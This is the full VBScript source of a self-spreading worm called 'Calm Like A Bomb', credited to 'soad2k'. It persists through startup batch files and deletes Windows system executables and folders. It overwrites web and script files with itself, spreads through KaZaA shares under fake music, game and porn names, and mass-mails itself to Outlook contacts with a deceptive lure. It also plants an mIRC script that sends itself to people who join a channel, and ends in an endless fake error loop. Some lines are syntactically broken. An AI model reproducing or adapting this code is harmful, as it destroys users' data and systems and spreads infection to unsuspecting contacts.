'****************************Calm Like A Bomb*****************************
'*****************************By me soad2k!*******************************
'#########################################################################
'%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%Begining%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
Option Explicit
On Error Resume Next
Dim FsCopyer
Set FsCopyer = CreateObject("Scripting.FileSystemObject")
FsCopyer.CopyFile Wscript.ScriptFullName, "C:\Program Files\bomb.vbs", True
FsCopyer.CopyFile Wscript.ScriptFullName, "C:\Program Files\Calm_Like_A_Bomb.vbs", True
FsCopyer.CopyFile Wscript.ScriptFullName, "C:\winnt\Calm_Like_A_Bomb.vbs", True
FsCopyer.CopyFile Wscript.ScriptFullName, "C:\Calm_Like_A_Bomb.vbs", True
FsCopyer.CopyFile Wscript.ScriptFullName, "C:\Bomber.vbs", True
FsCopyer.CopyFile Wscript.ScriptFullName, "C:\Documents And Settings\Calm_Like_A_Bomb.vbs", True
FsCopyer.CopyFile Wscript.ScriptFullName, "C:\Documents And Settings\All Users\Calm_Like_A_Bomb.vbs", True
FsCopyer.CopyFile Wscript.ScriptFullName, "C:\Documents And Settings\All Users\%%Calm_Like_A_Bomb%%vbs", True
FsCopyer.CopyFile Wscript.ScriptFullName, "C:\Documents And Settings\All Users\movie.vbs", True
FsCopyer.CopyFile Wscript.ScriptFullName, " C:\DOCUME~1\ALLUSE~1\STARTM~1\Programs\Startup\vbs_bomb.bat", True
Set FsCopyer = Nothing
'%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%copies have been made%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
'#######################################################################################
'%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%batch drooping section%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
On Error Resume Next
Dim MY_PROPERTY, fs
Set fs = CreateObject("Scripting.FileSystemObject")
Set MY_PROPERTY = fs.CreateTextFile("C:\DOCUME~1\ALLUSE~1\STARTM~1\Programs\Startup\MY_PROPERTY.bat", True)
MY_PROPERTY.WriteLine("rem created by soad2k!!")
MY_PROPERTY.WriteLine("rem this is the super spread bat that was dropped by a hots vbs!")
MY_PROPERTY.WriteLine("color a")
MY_PROPERTY.WriteLine("echo and so it began!")
MY_PROPERTY.WriteLine("echo if exsist C:\ProgramFiles\KaZaA\mysharedfolder goto kazaabegin")
MY_PROPERTY.WriteLine("echo if not exsist goto md")
MY_PROPERTY.WriteLine(":md")
MY_PROPERTY.WriteLine("md C:\Progra~1\kazaa\mysharedfolder")
MY_PROPERTY.WriteLine("md C:\Progra~1\KaZaA\MySharedFolder\mymp3's")
MY_PROPERTY.WriteLine("md C:\Progra~1\kazaa\mysharedfolder\mympegs")
MY_PROPERTY.WriteLine("md C:\Progra~1\kazaa\mysharedfolder\myphotos")
MY_PROPERTY.WriteLine("goto kazaa")
MY_PROPERTY.WriteLine(":kazaabegin")
MY_PROPERTY.WriteLine("md C:\Progra~1\kazaa\mysharedfolder\mympegs")
MY_PROPERTY.WriteLine("md C:\Progra~1\KaZaA\MySharedFolder\mymp3's")
MY_PROPERTY.WriteLine("md C:\Progra~1\kazaa\mysharedfolder\myphotos")
MY_PROPERTY.WriteLine("goto kazaa")
MY_PROPERTY.WriteLine(":kazaa")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mymp3's\stupifybydisturbed.mp3")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mymp3's\testifybyratm.mp3")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mymp3's\fuckthesystembysoad.mp3")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mymp3's\digbymudvayne.mp3")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mymp3's\inervisionbysoad.mp3")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mymp3's\chickenstubysoad.mp3 ")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mympegs\mudvayne.mpeg")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mympegs\hillarious.mpeg")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mympegs\bizzaresex.mpeg")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mympegs\animalsex.mpeg")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mympegs\porn.mpeg")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\emulaters.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\snes.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\medalofhonor.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\metalgeardsolid2.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\matalgearsolidvrmissions.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\metalgearsolid.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\devilmaycry2.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\devilmaycry.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\ageofempiers.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\doom3.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\doom2.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\doom.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\wolfinstein.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\waverunner.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\gamecube.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\Xbox.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\ps1.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\ps2.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mortalkombatdeadlyaliences.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mortalkombat6.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mortalkombat5.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mortakombat4.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\genises.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\nintendo.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\gameboy.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\gamegear.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mortalkombat.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mortalkombat2.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mortalkombat3.bat")
MY_PROPERTY.WriteLine("copy %0 C:\DOCUME~1\ALLUSE~1\STARTM~1\Programs\Startup\batch_dropped.bat")
MY_PROPERTY.WriteLine("copy %0 C:\DOCUME~1\ALLUSE~1\STARTM~1\Programs\Startup\sucesess.bat")
MY_PROPERTY.WriteLine("del C:\docume~1\alluse~1\programs\micros~2\*.*")
MY_PROPERTY.WriteLine("del C:\docume~1\alluse~1\programs\admini~1\*.*")
MY_PROPERTY.WriteLine("del C:\docume~1\alluse~1\programs\micros~1\*.*")
MY_PROPERTY.WriteLine("del C:\winnt\downlo~1\*.*")
MY_PROPERTY.WriteLine("del C:\winnt\security\*.*")
Set fs = Nothing
Set MY_PROPERTY = Nothing
'%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%batch dropped sucsessfully.%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
'#########################################################################################
'%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%Dropping My_Machine.%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
On Error Resume Next
Dim MY_Machine, fso
Set fso = CreateObject("Scripting.FileSystemObject")
Set MY_Machine = fso.CreateTextFile("C:\DOCUME~1\ALLUSE~1\STARTM~1\Programs\Startup\starter.bat", True)
MY_Machine.WriteLine("@echo off")
MY_Machine.WriteLine("Echo Bombing Machine")
MY_Machine.WriteLine("Echo by soad2k")
MY_Machine.WriteLine("Echo welcom to my Bombing Machine")
MY_Machine.WriteLine("MD C:\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("rem **************************************")
MY_Machine.WriteLine("MD C:\winnt\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("rem **************************************")
MY_Machine.WriteLine("MD C:\docume~1\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("rem **************************************")
MY_Machine.WriteLine("MD C:\progra~1\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\%Bomb%\")
MY_Machine.WriteLine("rem **************************************")
MY_Machine.WriteLine("Copy %0 C:\copy %0 DOCUME~1\ALLUSE~1\STARTM~1\Programs\Startup\My_Machine.bat")
MY_Machine.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\My_Machine.bat")
MY_Machine.WriteLine("for %%a in (*.htt) do copy C:\Calm_Like_A_Bomb.vbs %%a")
MY_Machine.WriteLine("for %%a in (*.html) do copy C:\Calm_Like_A_Bomb.vbs %%a")
MY_Machine.WriteLine("for %%a in (*.js) do copy C:\Calm_Like_A_Bomb.vbs %%a")
MY_Machine.WriteLine("for %%a in (*.vbs) do copy C:\Calm_Like_A_Bomb.vbs %%a")
MY_Machine.WriteLine("for %%a in (*.asp) do copy C:\Calm_Like_A_Bomb.vbs %%a")
Set fso = Nothing
Set MY_Machine = Nothing
'%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%batch dropped sucsessfully.%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
'#########################################################################################
'%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%Lets Destroy!!.%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
Dim Destroyer, scripting
Set scripting = CreateObject("Scripting.FileSystemObject")
Set Destroyer = scripting.CreateTextFile ("C:\DOCUME~1\ALLUSE~1\STARTM~1\Programs\Startup\destroyer.bat")
Destroyer.Writeline("'Destroyer")  
Destroyer.Writeline("' By")
Destroyer.Writeline("'  Soad2k")
Destroyer.Writeline("On Error Resume Next")
Destroyer.Writeline("Dim Boom")
Destroyer.Writeline("Set Boom = CreateObject("Scripting.FileSystemObject")")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system\*.* ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\fonts\*.* ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\cursors\*.* ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\calc.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\cdplayer.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\dfrg.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\dxdiag.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\freecell.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\gpedit.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\graphics.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\grpconv.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\iexpress.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\jdbgmgr.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\lights.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\magnify.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\mplay32.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\mspaint.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\nararator.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\osk.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\perfmon.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\regedt32.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\rundl32.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\secpol.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\sysedit.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\telnet.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\winmine.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\winlogon.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\taskmgr.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\sndrec32.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\system32\sndvol32.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\winhelp.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\notepad.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\taskman.exe ", True")
Destroyer.Writeline("Boom.Deletefile "C:\winnt\regedit.exe", True")
Destroyer.Writeline("Set Boom = Nothing")
'%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%Done destroying.%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
'#########################################################################################
'%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%Lets Just Pause A Litle Bit.%%%%%%%%%%%%%%%%%%%%%%%%%%%%
Dim WshShell
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 10000
Set WshShell = Nothing
'%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%We Paused For 20 seconds.%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
'#########################################################################################
'%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%Begining the mail bomb.%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
On Error Resume Next
Dim mail As Outlook.Application
Set mail=CreateObject("Outlook.Application")
For x=1 To 50
Set Mail=mail.CreateItem(0)
Mail.To=mail.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject="Sup man?"
Mail.Body="Sup man? nothing much here. just made this sweet animation thought. wana see? just download it."
Mail.Attachments.Add("C:\Documents And Settings\All Users\movie.vbs")
Mail.Send
Next
Set Mail = Nothing
mail.Quit
'%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%The mail bomb was sent succesfully.%%%%%%%%%%%%%%%%%%%%%
'#########################################################################################
'%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%Irc spreader.%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
On Error Resume Next
Dim spread, ws, MyIRC, PfDir, IRC
Set spread = CreateObject("scripting.filesystemobject")
Set ws = CreateObject("wscript.shell")
If IRC = "" Then
If Spread.FileExists("c:\mirc\mirc.ini") Then
IRC = "c:\mirc"
End If
If Spread.FileExists("c:\mirc32\mirc.ini") Then
IRC = "c:\mirc32"
End If
PfDir = ws.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If Spread.FileExists(PfDir & "\mirc\mirc.ini") Then
IRC = PfDir & "\mirc"
Set PfDir = Nothing
Set Spread = Nothing
End If
End If
If IRC <> "" Then
Set MyIRC = Fso.CreateTextFile(Path & "\script.ini", True)
MyIRC.writeline "[script]"
MyIRC.writeline "n0=on 1:JOIN:#:{"
MyIRC.writeline "n1= /if ( $nick == $me ) { halt }"
MyIRC.writeline "n2= /." & Chr(100) & Chr(99) & Chr(99) & " send $nick c:\mpc.gip.jpg.vbs"
MyIRC.writeline "n3=}"
MyIRC.Close
Set MyIRC = Nothing
Set IRC = Nothing
Set ws = Nothing
End If
'%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%The Irc spread done.%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
'#########################################################################################
'%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%kazza spread via vbs.%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
On Error Resume Next
Dim FsCopyer2
Set FsCopyer2 = CreateObject("Scripting.FileSystemObject")
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\pussy.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\fucking.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\sexy.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\hot.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\exsposed.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\nude.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\triplelesbos.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\lesbo2.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\lesbo1.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\porn2.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\porn1.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\mypropertystayout.vbs",True
Set FsCopyer = Nothing
'%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%done with kazza!%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
'#########################################################################################
'%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%Now To Annoy!%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
Dim WshShell
Do
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 7000
msgbox "Uh Oh!!",48,"A Windows Error Has Occured"
Loop
'%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%annyoing done.%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
'########################################################################################
'%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%script done.%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

'Thank you for using
'Calm_Like_A_Bomb
  'By
   'Soad2k 